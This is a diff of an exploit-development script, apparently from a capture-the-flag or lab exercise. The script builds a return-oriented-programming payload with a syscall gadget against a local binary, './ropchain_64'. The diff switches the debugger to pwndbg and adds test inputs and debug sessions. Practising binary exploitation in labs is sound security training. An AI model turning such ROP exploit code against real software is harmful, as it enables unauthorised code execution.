@@ -6,7 +6,7 @@ class Prog:
     def __init__(self):
         self.io = None
         self.multiarch = None
-        self.DEBUGGER = "peda"
+        self.DEBUGGER = "pwndbg"
         self.BINARY= "./ropchain_64"
         self.GDB_PORT = 1234
         self.DISABLE_ASLR = True
@@ -53,12 +53,22 @@ payload += p64(0x0000000000401184)
 
 
 # 0x0000000000401184 : syscall
+
+PROG.io.sendline(b"test1")
+PROG.io.interactive()
+PROG.multiarch.shutdown()
+
+PROG.multiarch.launch()
+PROG.io.sendline(b"test2")
+PROG.io.interactive()
+PROG.multiarch.shutdown()
+
+PROG.multiarch.debug()
 print(payload)
 PROG.io.sendline(payload)
 
-PROG.io.interactive() 
-
 
 PROG.multiarch.shutdown()
+
 
 
